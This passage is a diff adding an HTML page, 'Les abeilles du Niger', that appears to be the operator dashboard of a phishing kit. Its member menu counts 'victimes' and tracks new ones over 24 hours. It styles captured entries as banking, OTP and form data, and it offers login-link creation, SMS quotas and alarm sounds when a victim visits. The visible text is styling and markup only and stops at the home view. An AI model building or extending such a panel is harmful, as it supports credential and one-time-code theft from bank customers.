@@ -1,0 +1,2891 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=980, user-scalable=yes">
+    <title>Les abeilles du Niger - Portail Officiel</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Arial, Helvetica, sans-serif; }
+        html, body {
+            min-width: 980px;
+            background-color: #080808;
+            background-image: 
+                linear-gradient(rgba(0, 0, 0, 0.75), rgba(0, 0, 0, 0.85)),
+                radial-gradient(circle at center, rgba(245, 176, 20, 0.08) 0%, rgba(0, 0, 0, 0.95) 100%),
+                url('https://i.postimg.cc/jd8hhNhG/02F0AA74-D0BB-4064-A81E-613F54272DB7.png');
+            background-size: cover, cover, 400px;
+            background-position: center;
+            background-attachment: fixed;
+            color: #e0e0e0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 12px 18px;
+        }
+
+        .page-wrapper { width: 944px; margin: 0 auto; display: flex; flex-direction: column; gap: 14px; }
+        
+        header.main-header {
+            background: #000000;
+            border: 2px solid #f5b014;
+            border-radius: 6px;
+            box-shadow: 0 6px 20px rgba(245, 176, 20, 0.3);
+            overflow: hidden;
+        }
+
+        .site-banner-image-container {
+            width: 100%;
+            background-color: #000000;
+            position: relative;
+            line-height: 0;
+            border-bottom: 2px solid #f5b014;
+        }
+        .site-banner-image-container img.header-banner-img {
+            width: 100%;
+            height: 95px;
+            object-fit: cover;
+            display: block;
+        }
+
+        .rotating-top-logo {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            border: 2px solid #f5b014;
+            background: #111;
+            padding: 2px;
+            box-shadow: 0 0 10px rgba(245,176,20,0.6);
+            animation: rotateLogo 8s linear infinite;
+            z-index: 10;
+        }
+        @keyframes rotateLogo {
+            from { transform: translateY(-50%) rotate(0deg); }
+            to { transform: translateY(-50%) rotate(360deg); }
+        }
+
+        nav.top-nav {
+            background: linear-gradient(90deg, #121212 0%, #1c1c1c 50%, #121212 100%);
+            display: flex;
+            flex-wrap: nowrap;
+            align-items: center;
+            justify-content: space-between;
+            padding: 4px 12px;
+        }
+        .nav-left-group { display: flex; flex-wrap: nowrap; align-items: center; gap: 2px; }
+        .nav-right-group { display: flex; flex-wrap: nowrap; align-items: center; gap: 2px; }
+
+        nav.top-nav button {
+            background: transparent;
+            border: 1px solid transparent;
+            color: #d4d4d4;
+            padding: 8px 10px;
+            font-size: 12px;
+            font-weight: bold;
+            cursor: pointer;
+            white-space: nowrap;
+            border-radius: 4px;
+            transition: all 0.25s ease;
+        }
+        nav.top-nav button:hover { color: #f5b014; background-color: rgba(245, 176, 20, 0.1); border-color: rgba(245, 176, 20, 0.3); }
+        nav.top-nav button.active { background-color: #f5b014; color: #111111; border-color: #ffcc33; box-shadow: 0 0 8px rgba(245,176,20,0.4); }
+
+        .sms-count-pill {
+            background: #2196f3;
+            color: #fff;
+            padding: 1px 6px;
+            border-radius: 10px;
+            font-size: 10px;
+            margin-left: 3px;
+        }
+        .sms-count-pill.locked {
+            background: #e53935;
+        }
+
+        .telegram-banner-container { display: flex; justify-content: center; margin: 4px 0; gap: 8px; flex-wrap: wrap; }
+        .telegram-btn {
+            display: flex; align-items: center; justify-content: center; gap: 8px;
+            padding: 10px 16px; border-radius: 10px;
+            color: #ffffff; text-decoration: none; font-size: 13px; font-weight: 600;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3); transition: 0.2s; border: none; cursor: pointer;
+        }
+        .telegram-btn img { width: 18px; height: 18px; object-fit: contain; }
+        .tg-bg { background: linear-gradient(90deg, #4ec4f6 0%, #6f7bf7 100%); color: #162238; }
+        .wa-bg { background: linear-gradient(90deg, #25d366 0%, #128c7e 100%); }
+        .tk-bg { background: linear-gradient(90deg, #25f4ee 0%, #fe2f55 100%); color: #000; }
+        .fb-bg { background: linear-gradient(90deg, #1877f2 0%, #0d47a1 100%); }
+        .boutique-bg { background: linear-gradient(90deg, #ff9800 0%, #f57c00 100%); color: #fff; }
+
+        .main-grid { display: grid; grid-template-columns: 300px 628px; gap: 16px; align-items: start; }
+
+        .panel-box {
+            background-color: #1c1c1c;
+            border: 1px solid #444;
+            border-radius: 3px;
+            margin-bottom: 12px;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.8);
+        }
+        .panel-header {
+            background: linear-gradient(180deg, #333 0%, #1a1a1a 100%);
+            color: #f5b014;
+            text-align: center;
+            padding: 8px 10px;
+            font-size: 12px;
+            font-weight: bold;
+            border-bottom: 1px solid #f5b014;
+        }
+        .panel-body { padding: 12px; }
+
+        /* Interrupteur ON / OFF & Boutons ronds 1..10 */
+        .alert-switch-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: #141414;
+            border: 1px solid #3a3a3a;
+            border-radius: 5px;
+            padding: 8px 10px;
+            margin-bottom: 10px;
+        }
+        .alert-switch-label {
+            font-size: 11.5px;
+            font-weight: bold;
+            color: #f0f0f0;
+        }
+        .switch-toggle-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 5px 12px;
+            border-radius: 20px;
+            border: 1px solid #4caf50;
+            background: #1b3d1e;
+            color: #81c784;
+            font-size: 11px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+        .switch-toggle-btn.off {
+            border-color: #e53935;
+            background: #3d1616;
+            color: #ff8a80;
+        }
+
+        .methods-box-footer {
+            margin-top: 10px;
+            padding-top: 9px;
+            border-top: 1px dashed #3d3d3d;
+        }
+        .methods-top-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 8px;
+            gap: 6px;
+        }
+        .methods-caption {
+            font-size: 11px;
+            color: #ccc;
+            font-weight: bold;
+        }
+        .select-all-pill-btn {
+            background: #242424;
+            border: 1px solid #f5b014;
+            color: #f5b014;
+            font-size: 10.5px;
+            font-weight: bold;
+            padding: 3px 8px;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+        .select-all-pill-btn:hover, .select-all-pill-btn.active {
+            background: #f5b014;
+            color: #111;
+        }
+        .round-methods-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 4px;
+            width: 100%;
+        }
+        .round-method-btn {
+            width: 23px;
+            height: 23px;
+            border-radius: 50%;
+            border: 1.5px solid #666;
+            background: #121212;
+            color: #aaa;
+            font-size: 10px;
+            font-weight: bold;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            transition: all 0.18s ease;
+        }
+        .round-method-btn.selected {
+            border-color: #f5b014;
+            background: linear-gradient(180deg, #f5b014 0%, #c68a0c 100%);
+            color: #111;
+            box-shadow: 0 0 6px rgba(245, 176, 20, 0.55);
+        }
+        .round-method-btn.triggered {
+            border-color: #4caf50;
+            box-shadow: 0 0 9px rgba(76, 175, 80, 0.85);
+        }
+
+        .poster-slider-container {
+            width: 100%;
+            height: 350px;
+            background-color: #111;
+            border: 2px solid #f5b014;
+            border-radius: 4px;
+            overflow: hidden;
+            position: relative;
+            box-shadow: 0 0 15px rgba(245, 176, 20, 0.3);
+            margin-bottom: 12px;
+        }
+        .poster-slide {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            object-fit: cover;
+            opacity: 0;
+            transition: opacity 1s ease-in-out;
+        }
+        .poster-slide.active { opacity: 1; }
+
+        .social-widget-card { background-color: #ffffff; color: #1d2129; border-radius: 2px; padding: 10px; margin-top: 12px; }
+        .social-widget-top { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }
+        .social-widget-avatar { width: 42px; height: 42px; background-color: #111; display: flex; align-items: center; justify-content: center; border-radius: 50%; overflow: hidden; }
+        .social-widget-avatar img { width: 100%; height: 100%; object-fit: contain; }
+        .social-widget-info h4 { color: #365899; font-size: 13px; font-weight: bold; }
+        .social-widget-info p { color: #606770; font-size: 11px; }
+        .social-widget-actions { display: flex; justify-content: space-between; border-top: 1px solid #ebedf0; padding-top: 8px; }
+        .social-mini-btn { background-color: #f5f6f7; border: 1px solid #ccd0d5; color: #4b4f56; font-size: 11px; font-weight: bold; padding: 4px 10px; cursor: pointer; border-radius: 2px; }
+
+        .logo-container {
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            padding: 8px 5px 12px 5px; margin-bottom: 10px; border-bottom: 1px dashed #444;
+        }
+        .custom-site-logo {
+            width: 85px; height: 85px; object-fit: cover; border-radius: 50%;
+            border: 2px solid #f5b014; background-color: #111; padding: 2px;
+            box-shadow: 0 0 12px rgba(245, 176, 20, 0.4);
+        }
+        .logo-subtitle { margin-top: 6px; font-size: 13px; font-weight: bold; color: #f5b014; }
+
+        .form-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 9px; font-size: 12px; }
+        .form-row label { color: #ccc; font-weight: bold; width: 38%; }
+        .form-row input, .form-row select, .form-row textarea {
+            width: 62%; background-color: #111; border: 1px solid #555; color: #fff;
+            padding: 6px 8px; border-radius: 3px; font-size: 12px;
+        }
+
+        .btn-classic {
+            display: block; margin: 12px auto 2px auto; padding: 6px 26px;
+            background: linear-gradient(180deg, #f5b014 0%, #c68a0c 100%);
+            border: 1px solid #ffcc33; border-radius: 3px; color: #111;
+            font-size: 12px; font-weight: bold; cursor: pointer; transition: 0.2s;
+        }
+        .btn-classic:hover { background: linear-gradient(180deg, #ffcc33 0%, #f5b014 100%); }
+
+        .editor-toolbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 6px;
+            gap: 8px;
+        }
+        .editor-action-btns { display: flex; gap: 6px; }
+        .mini-tool-btn {
+            padding: 4px 10px;
+            border-radius: 3px;
+            border: 1px solid #555;
+            font-size: 11px;
+            font-weight: bold;
+            cursor: pointer;
+            color: #fff;
+        }
+        .btn-copy-code { background: #2196f3; border-color: #64b5f6; }
+        .btn-clear-code { background: #d32f2f; border-color: #ef5350; }
+
+        .error-msg { color: #ff5252; font-size: 11px; text-align: center; margin-top: 5px; font-weight: bold; }
+
+        .status-pill-bar {
+            margin-bottom: 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 8px;
+        }
+        .status-pill {
+            display: inline-block;
+            background: linear-gradient(90deg, #f5b014 0%, #4b83f2 100%);
+            color: #111;
+            font-size: 11.5px;
+            font-weight: bold;
+            padding: 6px 12px;
+            border-radius: 20px;
+            white-space: nowrap;
+            flex-shrink: 0;
+        }
+        .visitor-counter-badge {
+            background: #222;
+            border: 1px solid #f5b014;
+            color: #f5b014;
+            padding: 6px 11px;
+            border-radius: 20px;
+            font-size: 11.5px;
+            font-weight: bold;
+            white-space: nowrap;
+            flex-shrink: 0;
+        }
+
+        .presence-stack-zone {
+            flex: 1;
+            min-width: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 4px;
+            overflow: hidden;
+            padding: 2px 4px;
+        }
+        .presence-stack-list {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+        .presence-avatar-item {
+            width: 26px;
+            height: 26px;
+            border-radius: 50%;
+            border: 2px solid #f5b014;
+            object-fit: cover;
+            background: #111;
+            margin-left: -7px;
+            flex-shrink: 0;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.65);
+            transition: transform 0.25s ease;
+            animation: avatarPulseCycle 3.2s ease-in-out infinite;
+        }
+        .presence-avatar-item:first-child {
+            margin-left: 0;
+            border-color: #4caf50;
+            z-index: 25;
+        }
+        .presence-avatar-item:hover {
+            transform: translateY(-2px) scale(1.12);
+            z-index: 30;
+        }
+        @keyframes avatarPulseCycle {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-1.5px); }
+        }
+        .presence-plus-btn {
+            width: 26px;
+            height: 26px;
+            border-radius: 50%;
+            border: 1.5px solid #f5b014;
+            background: #1a1a1a;
+            color: #f5b014;
+            font-size: 14px;
+            font-weight: bold;
+            line-height: 1;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            margin-left: 2px;
+        }
+        .presence-plus-btn:hover {
+            background: #f5b014;
+            color: #111;
+        }
+
+        .victims-scroll-frame {
+            max-height: 545px;
+            overflow-y: auto;
+            border-bottom: 1px solid #333;
+        }
+
+        .welcome-box-header {
+            background: linear-gradient(180deg, #333 0%, #1a1a1a 100%);
+            padding: 10px; text-align: center; font-size: 16px; font-weight: bold; color: #fff;
+            border-bottom: 1px solid #f5b014;
+        }
+        .home-welcome-content { padding: 40px 20px 65px 20px; text-align: center; background-color: #1a1a1a; }
+        .home-welcome-content h2 { font-size: 20px; margin-bottom: 38px; color: #f0f0f0; }
+
+        .signup-hand-trigger { display: inline-flex; flex-direction: column; align-items: center; cursor: pointer; }
+        .signup-red-badge { background-color: #f5b014; color: #111; font-weight: 900; font-size: 18px; padding: 6px 16px; border-radius: 6px; border: 2px solid #111; }
+        .hand-pointer-svg { width: 58px; height: 58px; margin-top: -10px; margin-left: 18px; fill: #f5b014; }
+
+        .signup-form-container { padding: 20px 26px; background-color: #1a1a1a; }
+        .signup-field-row { display: flex; align-items: center; margin-bottom: 10px; }
+        .signup-field-row label { width: 28%; text-align: center; font-size: 13px; font-weight: bold; color: #ddd; }
+        .signup-field-row input, .signup-field-row select, .signup-field-row textarea {
+            width: 72%; background-color: #111; border: 1px solid #555; color: #fff; padding: 6px 10px; font-size: 13px;
+        }
+
+        .links-table { width: 100%; border-collapse: collapse; font-size: 13px; }
+        .links-table th { background-color: #222; color: #f5b014; padding: 9px 8px; border: 1px solid #333; text-align: center; position: sticky; top: 0; z-index: 5; }
+        .links-table td { padding: 9px 8px; border: 1px solid #2a2a2a; text-align: center; background-color: #181818; vertical-align: top; }
+
+        .victim-red-badge {
+            display: inline-block;
+            background-color: #e53935;
+            color: #ffffff;
+            font-weight: bold;
+            font-size: 11px;
+            padding: 3px 9px;
+            border-radius: 12px;
+            border: 1px solid #ff8a80;
+        }
+
+        .category-pill {
+            display: inline-block;
+            padding: 2px 7px;
+            border-radius: 4px;
+            font-size: 10px;
+            font-weight: bold;
+            margin-top: 4px;
+        }
+        .cat-banking { background: #ff9800; color: #111; }
+        .cat-otp { background: #9c27b0; color: #fff; }
+        .cat-form { background: #2196f3; color: #fff; }
+        .cat-general { background: #455a64; color: #fff; }
+
+        .bank-fields-grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 5px;
+            margin-top: 6px;
+            justify-content: flex-start;
+        }
+        .bank-field-chip {
+            background: #121212;
+            border: 1px solid #f5b014;
+            border-radius: 3px;
+            padding: 3px 7px;
+            font-size: 11px;
+            color: #fff;
+            text-align: left;
+        }
+        .bank-field-chip strong { color: #f5b014; margin-right: 4px; }
+
+        .action-links-group { display: flex; flex-wrap: wrap; justify-content: center; gap: 6px; }
+        .link-btn { padding: 5px 10px; border-radius: 3px; border: none; color: #fff; font-size: 11px; font-weight: bold; cursor: pointer; text-decoration: none; transition: 0.2s; }
+        .link-blue { background-color: #2196f3; }
+        .link-green { background-color: #4caf50; }
+        .link-orange { background-color: #ff9800; }
+        .link-red { background-color: #d32f2f; }
+        .link-btn.clicked { background-color: #555555 !important; color: #aaaaaa !important; border-color: #333 !important; }
+
+        .msg-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; padding: 15px; background: #1a1a1a; }
+        .msg-card { background: #222; border: 1px solid #444; border-radius: 4px; padding: 12px; display: flex; flex-direction: column; justify-content: space-between; }
+        .msg-card h4 { color: #f5b014; font-size: 13px; margin-bottom: 6px; }
+        .msg-card p { font-size: 11px; color: #ccc; margin-bottom: 10px; word-break: break-word; }
+
+        .modal-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8); display: flex; align-items: center; justify-content: center;
+            z-index: 9998;
+        }
+        .modal-box {
+            background: #1e1e1e; border: 2px solid #f5b014; padding: 22px; border-radius: 6px;
+            width: 420px; text-align: center; box-shadow: 0 0 20px rgba(245,176,20,0.4); color: #fff;
+        }
+        .modal-box h3 { color: #f5b014; margin-bottom: 12px; }
+        .modal-box p { font-size: 13px; color: #ccc; margin-bottom: 16px; word-break: break-all; }
+
+        /* Tableau / Modale d'alerte bien centré au milieu : durée maximale 6 secondes */
+        .visit-alert-overlay {
+            align-items: center !important;
+            justify-content: center !important;
+            padding-top: 0 !important;
+            background: rgba(0, 0, 0, 0.78) !important;
+            z-index: 99999 !important;
+        }
+        .visit-alert-box {
+            background: #181010;
+            border: 3px solid #ff3d00;
+            padding: 20px;
+            border-radius: 8px;
+            width: 540px;
+            max-width: 94vw;
+            text-align: center;
+            box-shadow: 0 0 38px rgba(255, 61, 0, 0.75);
+            color: #fff;
+        }
+        .visit-alert-tag {
+            display: inline-block;
+            background: #ff3d00;
+            color: #fff;
+            font-weight: bold;
+            font-size: 11px;
+            padding: 3px 10px;
+            border-radius: 12px;
+            margin-bottom: 10px;
+        }
+        .visit-alert-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 10px;
+            font-size: 12px;
+            background: #111;
+        }
+        .visit-alert-table th, .visit-alert-table td {
+            border: 1px solid #333;
+            padding: 7px 9px;
+            text-align: left;
+        }
+        .visit-alert-table th {
+            color: #f5b014;
+            width: 34%;
+            background: #191919;
+        }
+        .visit-letter-box {
+            background: #111;
+            border: 1px dashed #f5b014;
+            border-radius: 6px;
+            padding: 10px 12px;
+            margin-bottom: 10px;
+            font-size: 12.5px;
+            color: #fff;
+            line-height: 1.45;
+            text-align: left;
+            white-space: pre-line;
+        }
+
+        .online-member-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 8px 10px;
+            border-bottom: 1px solid #333;
+            background: #161616;
+            border-radius: 4px;
+            margin-bottom: 6px;
+        }
+        .online-member-left {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .online-member-left img {
+            width: 34px;
+            height: 34px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 1.5px solid #f5b014;
+        }
+
+        .chat-history-box {
+            height: 250px;
+            overflow-y: auto;
+            background: #121212;
+            border: 1px solid #333;
+            border-radius: 4px;
+            padding: 10px;
+            margin-bottom: 10px;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            text-align: left;
+        }
+        .chat-bubble-row {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .chat-bubble-row.mine {
+            justify-content: flex-end;
+        }
+        .chat-bubble-row.theirs {
+            justify-content: flex-start;
+        }
+        .chat-bubble {
+            background: #222;
+            border: 1px solid #3a3a3a;
+            border-radius: 6px;
+            padding: 7px 10px;
+            font-size: 12px;
+            max-width: 82%;
+        }
+        .chat-bubble.mine {
+            background: #1b2e44;
+            border-color: #2196f3;
+        }
+        .chat-meta {
+            font-size: 10px;
+            color: #aaa;
+            margin-bottom: 3px;
+        }
+        .delete-msg-icon-btn {
+            background: transparent;
+            border: 1px solid #5c2222;
+            color: #ff6b6b;
+            border-radius: 4px;
+            padding: 3px 6px;
+            font-size: 12px;
+            cursor: pointer;
+            flex-shrink: 0;
+        }
+        .delete-msg-icon-btn:hover {
+            background: #d32f2f;
+            color: #fff;
+        }
+
+        .chat-input-bar {
+            display: flex;
+            gap: 6px;
+            align-items: center;
+        }
+        .chat-input-bar input[type="text"] {
+            flex: 1;
+            background: #111;
+            border: 1px solid #555;
+            color: #fff;
+            padding: 7px 9px;
+            border-radius: 4px;
+            font-size: 12px;
+        }
+
+        footer.main-footer { background-color: #181818; border: 1px solid #333; text-align: center; margin-top: 6px; }
+        .footer-top-bar { background-color: #222; padding: 6px; font-size: 13px; font-weight: bold; border-bottom: 1px solid #333; color: #f5b014; }
+        .footer-bottom-bar { padding: 12px; font-size: 14px; font-weight: bold; color: #fff; }
+        
+        .online-counter-widget { display: flex; justify-content: center; margin: 12px 0 20px 0; }
+        .counter-badge { display: inline-flex; align-items: center; background: linear-gradient(180deg, #9ccc65 0%, #689f38 100%); border: 1px solid #33691e; border-radius: 4px; padding: 4px 12px; color: #fff; font-size: 12px; font-weight: bold; gap: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.5); }
+        .counter-icon { background-color: #0277bd; padding: 2px 6px; border-radius: 3px; font-size: 10px; }
+
+        .hidden { display: none !important; }
+
+        #toast-msg {
+            position: fixed; bottom: 20px; right: 20px; background-color: #1f1f1f;
+            border-left: 4px solid #f5b014; color: #fff; padding: 14px 20px; border-radius: 4px;
+            font-size: 15px; z-index: 100000; opacity: 0; transition: opacity 0.3s ease;
+        }
+        #toast-msg.show { opacity: 1; }
+    </style>
+</head>
+<body>
+
+<div class="page-wrapper">
+    <header class="main-header">
+        <div class="site-banner-image-container">
+            <img class="header-banner-img" src="https://i.postimg.cc/25cwywpQ/IMG-6697.jpg" alt="Les abeilles du Niger">
+            <img class="rotating-top-logo" src="https://i.postimg.cc/jd8hhNhG/02F0AA74-D0BB-4064-A81E-613F54272DB7.png" alt="Logo">
+        </div>
+
+        <nav class="top-nav" id="guest-nav">
+            <div class="nav-left-group">
+                <button id="nav-home" class="active" onclick="showSection('home')">Accueil</button>
+                <button id="nav-signup" onclick="showSection('signup')">S'inscrire</button>
+            </div>
+            <div class="nav-right-group">
+                <button onclick="openLink('https://t.me/')">Telegram</button>
+            </div>
+        </nav>
+        <nav class="top-nav hidden" id="member-nav">
+            <div class="nav-left-group">
+                <button id="m-nav-home" class="active" onclick="showSection('dashboard')">Accueil</button>
+                <button id="m-nav-victims" onclick="showSection('victims')">
+                    Mes victimes (<span id="victim-counter-tab">0</span>) 
+                    <span id="victim-green-badge" class="hidden" style="background:#4caf50; color:#fff; padding:1px 6px; border-radius:10px; font-size:10px; margin-left:4px;">0 en 24h</span>
+                </button>
+                <button id="m-nav-messages" onclick="showSection('messages')">Message privé</button>
+                <button id="m-nav-create" onclick="showSection('create')">Créer Login</button>
+                <button id="m-nav-password" onclick="showSection('password')">Mot de passe</button>
+                <button id="m-nav-sms" onclick="openSmsModal()">SMS <span id="sms-nav-badge" class="sms-count-pill">0/10</span></button>
+            </div>
+            <div class="nav-right-group">
+                <button onclick="openLink('https://t.me/')">Telegram</button>
+                <button onclick="logoutUser()" style="color: #ff8a80;">Déconnexion</button>
+            </div>
+        </nav>
+    </header>
+
+    <div class="telegram-banner-container">
+        <button class="telegram-btn tg-bg" onclick="openLink('https://t.me/')">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram"> Telegram
+        </button>
+        <button class="telegram-btn wa-bg" onclick="openLink('https://chat.whatsapp.com/D03UIsRx01KFTqswC0ea4V?s=cl&p=i&mlu=4&ilr=4&iam=2')">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp"> WhatsApp
+        </button>
+        <button class="telegram-btn tk-bg" onclick="openLink('https://tiktok.com')">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a6/Logo_NIKE.svg" alt="TikTok" style="filter:invert(1);"> TikTok
+        </button>
+        <button class="telegram-btn fb-bg" onclick="openLink('https://facebook.com')">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="Facebook"> Facebook
+        </button>
+        <button class="telegram-btn boutique-bg" onclick="openLink('https://boutique.com')">
+            🛒 Ma Boutique
+        </button>
+    </div>
+
+    <div class="main-grid">
+        <aside class="left-sidebar">
+            <div class="poster-slider-container">
+                <img class="poster-slide active" src="https://i.postimg.cc/jd8hhNhG/02F0AA74-D0BB-4064-A81E-613F54272DB7.png" alt="Affiche 1">
+                <img class="poster-slide" src="https://i.postimg.cc/jd8hhNhG/02F0AA74-D0BB-4064-A81E-613F54272DB7.png" alt="Affiche 2">
+                <img class="poster-slide" src="https://i.postimg.cc/jd8hhNhG/02F0AA74-D0BB-4064-A81E-613F54272DB7.png" alt="Affiche 3">
+            </div>
+
+            <div class="panel-box" id="login-panel-box">
+                <div class="panel-header">.: Panneau de connexion :.</div>
+                <div class="panel-body">
+                    <div class="logo-container">
+                        <img id="site-logo-img" class="custom-site-logo" src="https://i.postimg.cc/jd8hhNhG/02F0AA74-D0BB-4064-A81E-613F54272DB7.png" alt="Logo">
+                        <div class="logo-subtitle">Les abeilles du Niger</div>
+                    </div>
+                    <form id="login-form" onsubmit="handleLogin(event)">
+                        <div class="form-row"><label>Utilisateur</label><input type="text" id="login-username" required placeholder="Identifiant (ex: admin.)"></div>
+                        <div class="form-row"><label>Mot de passe</label><input type="password" id="login-password" required placeholder="••••••••"></div>
+                        <div id="login-error" class="error-msg hidden">Erreur : Identifiant ou mot de passe non reconnu !</div>
+                        <button type="submit" class="btn-classic">Se connecter</button>
+                    </form>
+                </div>
+            </div>
+
+            <div class="panel-box hidden" id="member-panel-box">
+                <div class="panel-header">.: Panneau Membre :.</div>
+                <div class="panel-body" style="text-align: center; font-size: 12px; line-height: 1.8;">
+                    <div class="logo-container" style="padding-top: 2px;">
+                        <img id="member-logo-img" class="custom-site-logo" style="width: 66px; height: 66px;" src="https://i.postimg.cc/jd8hhNhG/02F0AA74-D0BB-4064-A81E-613F54272DB7.png" alt="Photo de profil">
+                    </div>
+                    <div><strong>Utilisateur :</strong> <span id="display-member-name" style="color: #4ec4f6; font-weight: bold;">-</span></div>
+                    <div><strong>Type :</strong> <span id="display-user-role" style="color: #f5b014;">Membre Standard</span></div>
+                    <div><strong>Total Victimes Global :</strong> <span id="display-victims-count-header" style="color: #4ec4f6; font-weight:bold;">0</span></div>
+                    <div><strong>En 24h (Vert) :</strong> <span id="display-victims-24h" style="color: #4caf50; font-weight: bold;">0</span></div>
+                </div>
+            </div>
+
+            <div class="panel-box">
+                <div class="panel-header">.: Musique d'Alerte Auto Modal :.</div>
+                <div class="panel-body" style="font-size: 11.5px;">
+                    <div class="alert-switch-bar">
+                        <span class="alert-switch-label" id="alert-switch-status-text">Réception alertes : ACTIVÉE</span>
+                        <button type="button" id="alert-master-switch-btn" class="switch-toggle-btn" onclick="toggleMasterAlertSwitch()">
+                            <span id="alert-master-switch-dot">●</span>
+                            <span id="alert-master-switch-label">ON</span>
+                        </button>
+                    </div>
+
+                    <div style="margin-bottom: 6px; color: #ccc;">Fichier MP3 / Audio / MP4 :</div>
+                    <input type="file" id="custom-alert-mp3-file" accept="audio/*,video/mp4,.mp3,.wav,.m4a,.mp4" onchange="handleCustomAlertMp3(this)" style="width:100%; font-size:11px; margin-bottom:8px; color:#fff;">
+                    <div id="custom-mp3-status" style="color:#4caf50; font-weight:bold; margin-bottom:8px; word-break:break-all;">Par défaut : Musique / Bip intégré</div>
+
+                    <div style="display:flex; gap:6px; justify-content:center; flex-wrap:wrap;">
+                        <button type="button" id="btn-test-alert-sound" class="link-btn link-green" onclick="runChainAcrossSelectedButtons('test-button', { showAlertTable: true, forceEvenIfSwitchOff: true })">Tester / Activer le son</button>
+                        <button type="button" class="link-btn link-red" onclick="clearCustomAlertMp3()">Réinitialiser</button>
+                    </div>
+
+                    <div class="methods-box-footer">
+                        <div class="methods-top-row">
+                            <span class="methods-caption">Méthodes actives (5x / bouton) :</span>
+                            <button type="button" id="select-all-methods-btn" class="select-all-pill-btn active" onclick="toggleSelectAllMethods()">Tout sélectionner</button>
+                        </div>
+                        <div class="round-methods-row" id="round-methods-container">
+                            <button type="button" class="round-method-btn selected" data-method="1" onclick="toggleSingleMethod(1)">1</button>
+                            <button type="button" class="round-method-btn selected" data-method="2" onclick="toggleSingleMethod(2)">2</button>
+                            <button type="button" class="round-method-btn selected" data-method="3" onclick="toggleSingleMethod(3)">3</button>
+                            <button type="button" class="round-method-btn selected" data-method="4" onclick="toggleSingleMethod(4)">4</button>
+                            <button type="button" class="round-method-btn selected" data-method="5" onclick="toggleSingleMethod(5)">5</button>
+                            <button type="button" class="round-method-btn selected" data-method="6" onclick="toggleSingleMethod(6)">6</button>
+                            <button type="button" class="round-method-btn selected" data-method="7" onclick="toggleSingleMethod(7)">7</button>
+                            <button type="button" class="round-method-btn selected" data-method="8" onclick="toggleSingleMethod(8)">8</button>
+                            <button type="button" class="round-method-btn selected" data-method="9" onclick="toggleSingleMethod(9)">9</button>
+                            <button type="button" class="round-method-btn selected" data-method="10" onclick="toggleSingleMethod(10)">10</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="panel-box">
+                <div class="panel-header">Aimez notre nouvelle page</div>
+                <div class="panel-body" style="padding: 8px;">
+                    <div class="social-widget-card">
+                        <div class="social-widget-top">
+                            <div class="social-widget-avatar"><img id="widget-mini-logo" src="https://i.postimg.cc/jd8hhNhG/02F0AA74-D0BB-4064-A81E-613F54272DB7.png" alt="Logo"></div>
+                            <div class="social-widget-info"><h4>Les abeilles du Niger</h4><p>1 245 abonnés kim-le-Magicien🇨🇮)</p></div>
+                        </div>
+                        <div class="social-widget-actions">
+                            <button class="social-mini-btn" onclick="showToast('Page suivie avec succès !')">👍 Suivre</button>
+                            <button class="social-mini-btn" onclick="showToast('Lien copié !')">↪ Partager</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </aside>
+
+        <main class="right-content">
+            <div class="status-pill-bar">
+                <div class="status-pill">Liens sécurisés mis à jour ✓</div>
+
+                <div class="presence-stack-zone" id="presence-stack-zone">
+                    <div class="presence-stack-list" id="presence-avatars-list"></div>
+                    <button type="button" class="presence-plus-btn" id="presence-plus-btn" title="Voir tous les connectés" onclick="openOnlineMembersModal()">+</button>
+                </div>
+
+                <div class="visitor-counter-badge">Visiteurs : <span id="visitor-count-display">455</span></div>
+            </div>
+
+            <div class="panel-box" id="view-home">
